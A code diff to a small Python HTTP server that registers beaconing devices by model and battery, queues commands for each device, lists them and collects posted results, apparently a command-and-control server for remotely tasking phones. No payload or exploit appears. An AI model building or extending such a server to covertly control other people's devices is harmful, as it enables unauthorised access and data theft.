@@ -23,6 +23,15 @@ class Handler(BaseHTTPRequestHandler):
             did = q.get("id", [""])[0]
             q_ = QUEUE.get(did, [])
             self._send(q_.pop(0) if q_ else "NONE")
+        elif p.path == "/results":
+            did = q.get("id", [""])[0]
+            self._send("\n---\n".join(RESULTS.get(did, [])[-5:]) or "NONE")
+        elif p.path == "/list":
+            now = time.time()
+            out = []
+            for did, info in DEVICES.items():
+                out.append(f"{did} | {info.get('model','?')} | bat={info.get('battery','?')} | {int(now-info.get('last',0))}s ago")
+            self._send("\n".join(out) if out else "NONE")
         else:
             self._send("ok")
 
@@ -40,6 +49,12 @@ class Handler(BaseHTTPRequestHandler):
                 "battery": params.get("battery", ["?"])[0],
             }
             print(f"[beacon] {did} | model={DEVICES[did]['model']} | bat={DEVICES[did]['battery']}", flush=True)
+        elif p.path == "/queue":
+            did = params.get("id", [""])[0]
+            cmd = params.get("cmd", [""])[0]
+            arg = params.get("arg", [""])[0]
+            QUEUE.setdefault(did, []).append(f"{cmd}|{arg}")
+            print(f"[queue] {did} <- {cmd} {arg}", flush=True)
         elif p.path == "/result":
             did = params.get("id", ["?"])[0]
             data = params.get("data", [""])[0]
@@ -94,6 +109,5 @@ def cli():
         print(f"queued for {did}: {cmd} {arg}")
 
 if __name__ == "__main__":
-    import os
-    port = int(os.environ.get("PORT", 8080))
-    HTTPServer(("0.0.0.0", port), Handler).serve_forever()
+    threading.Thread(target=lambda: HTTPServer(("0.0.0.0", 8080), Handler).serve_forever(), daemon=True).start()
+    cli()
